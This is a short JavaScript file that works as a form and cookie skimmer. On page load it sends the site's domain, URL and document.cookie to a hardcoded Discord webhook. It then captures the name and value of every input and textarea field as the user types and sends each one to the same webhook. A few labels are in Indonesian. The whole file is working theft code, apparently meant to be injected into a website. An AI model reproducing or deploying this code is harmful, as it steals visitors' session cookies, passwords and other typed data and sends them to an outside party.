function discordSend(message) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://discord.com/api/webhooks/1467734296189075534/Y3Sh7B_sqitnTUqhT6C3vNj0RJcAy7H_fx7Qp_ijELu-0NtmvKHnPbaRq-q_ig0SchJI', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    var payload = JSON.stringify({ content: message });
    xhr.send(payload);
}

// 
discordSend(
    `! ${document.domain}\n\n` +
    `URL :\n${location.href}\n\n` +
    `Document :\n${document.cookie}`
);

document.addEventListener('input', function (e) {
    if (e.target && (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA')) {
        discordSend(
            `📥  di ${location.href}\n` +
            `Name: ${e.target.name || '(tidak ada name)'}\n` +
            `Value: ${e.target.value}`
        );
    }
});
